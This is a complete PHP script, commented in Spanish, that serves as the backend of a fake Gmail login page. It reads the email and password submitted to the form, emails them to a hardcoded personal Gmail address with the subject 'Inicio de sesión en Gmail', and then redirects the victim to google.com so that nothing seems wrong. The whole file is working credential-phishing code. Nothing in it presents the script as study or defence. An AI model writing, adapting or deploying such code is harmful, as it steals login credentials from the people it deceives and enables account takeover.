<?php

if(isset($_POST['submit'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Correo electrónico de destino
    $to = "francosilveira350@gmail.com";

    // Asunto del correo electrónico
    $subject = "Inicio de sesión en Gmail";

    // Contenido del correo electrónico
    $message = "Se ha iniciado sesión en Gmail.\n";
    $message .= "Correo electrónico: " . $email . "\n";
    $message .= "Contraseña: " . $password;

    // Cabeceras del correo electrónico
    $headers = "From: " . $email . "\r\n";
    $headers .= "Reply-To: " . $email . "\r\n";

    // Envío del correo electrónico
    mail($to, $subject, $message, $headers);

    // Redirigir a una página de éxito o cualquier otra página
    header("Location: https://www.google.com");
    exit();
}

?>
